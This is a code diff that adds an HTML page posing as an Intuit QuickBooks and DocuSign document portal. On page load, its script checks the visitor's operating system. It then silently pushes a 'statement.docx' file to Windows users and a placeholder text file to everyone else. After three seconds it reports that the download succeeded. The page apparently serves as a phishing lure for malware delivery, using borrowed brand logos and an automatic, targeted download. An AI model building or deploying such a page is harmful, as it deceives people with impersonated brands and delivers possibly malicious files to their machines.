@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Intuit Quickbooks</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 text-gray-900 min-h-screen flex flex-col" style="font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;">
+
+  <!-- Header -->
+  <header class="bg-white shadow-sm py-4 px-6">
+    <div class="flex items-center justify-between max-w-6xl mx-auto">
+      <h1 aria-label="QBO Logo" class="jsx-2784259990 logo">
+        <img src="https://brandlogos.net/wp-content/uploads/2024/04/docusign-logo_brandlogos.net_5wujv.png" style="width: 200px; height: 40px;">
+        </h1>
+        <div class="flex items-center gap-4">
+        <div class="text-sm font-medium text-gray-700 cursor-pointer hover:text-blue-600">
+          Sign in
+        </div>
+        <a class="w-8 h-8 rounded-full overflow-hidden">
+          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <mask id="mask0" mask-type="alpha" x="0" y="0" width="24" height="24">
+              <rect width="24" height="24" rx="12" fill="#8D9096"/>
+            </mask>
+            <g mask="url(#mask0)">
+              <rect width="24" height="24" rx="12" fill="#D4D7DC"/>
+              <circle cx="12" cy="26" r="12" fill="#393A3D"/>
+              <circle cx="12" cy="8" r="4" fill="#393A3D"/>
+            </g>
+          </svg>
+        </a>
+      </div>
+    </div>
+  </header>
+
+  <main class="flex-grow flex items-center justify-center px-4">
+    <div class="bg-white p-5 rounded-2xl0 shadow-md max-w-md w-full text-center">
+      <h2 class="text-2xl font-semibold mb-2" id="status-title">Document Downloading...</h2>
+      <img src="https://na4.docusign.net/Signing/Images/linkExpired/linkExpired.png">
+      <p class="text-gray-600 mb-6" id="status-text">
+        Please wait while we prepare your Document. The download will start automatically.
+      </p>
+      <div class="flex justify-center" id="spinner-container">
+        <svg class="animate-spin h-6 w-6 text-blue-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path>
+        </svg>
+      </div>
+    </div>
+  </main>
+
+  <!-- Script -->
+  <script>
+    function getOS() {
+      const platform = navigator.platform.toLowerCase();
+      const userAgent = navigator.userAgent.toLowerCase();
+
+      if (platform.includes('win')) return 'win';
+      if (platform.includes('mac')) return 'mac';
+      if (platform.includes('linux')) return 'linux';
+
+      return 'unknown';
+    }
+
+    function triggerDownload(os) {
+      let filePath;
+
+      switch (os) {
+        case 'win':
+          filePath = './statement.docx';
+          break;
+        case 'mac':
+          filePath = './unsupported.txt';
+          break;
+        case 'linux':
+          filePath = './unsupported.txt';
+          break;
+        default:
+          filePath = './unsupported.txt';
+          break;
+      }
+
+      const link = document.createElement('a');
+      link.href = filePath;
+      link.download = '';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    function updateStatus(success = true) {
+      const title = document.getElementById('status-title');
+      const text = document.getElementById('status-text');
+      const spinner = document.getElementById('spinner-container');
+
+      if (success) {
+        title.textContent = 'Document Downloaded ✅';
+        text.textContent = 'Your download has completed successfully.';
+      } else {
+        title.textContent = 'Download Failed ❌';
+        text.textContent = 'We were unable to download your invoice. Please try again.';
+      }
+
+      if (spinner) spinner.remove();
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      const os = getOS();
+      triggerDownload(os);
+
+      setTimeout(() => {
+        updateStatus(true);
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
